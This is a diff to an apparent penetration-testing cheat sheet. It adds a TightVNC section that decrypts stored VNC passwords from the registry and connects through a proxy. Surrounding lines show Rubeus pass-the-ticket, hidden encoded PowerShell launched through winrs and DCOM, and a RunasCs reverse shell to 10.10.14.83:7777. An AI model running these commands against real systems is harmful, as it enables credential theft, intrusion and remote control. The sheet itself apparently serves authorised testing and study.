@@ -59,6 +59,7 @@
   - [winRM](#winrm)
   - [DCOM](#dcom)
   - [RunasCs](#runascs)
+  - [TightVNC](#tightvnc)
 - [Discovery](#discovery)
   - [Windows](#windows-3)
     - [LOLBIN](#lolbin)
@@ -704,7 +705,6 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 # winrs 
 winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "
 
-
 # restrict ticket on host RDP
 .\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap
 .\Rubeus.exe createnetonly /program:powershell.exe /show
@@ -723,6 +723,16 @@ $mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwA
 https://github.com/antonioCoco/RunasCs
 ```powershell
 .\RunasCs.exe username password cmd.exe -r 10.10.14.83:7777
+```
+## TightVNC
+https://github.com/frizb/PasswordDecrypts
+```bash
+reg query HKLM\SOFTWARE\TightVNC\Server /s
+echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+
+# Linux
+apt-get install xtightvncviewer
+echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
 ```
 
 # Discovery
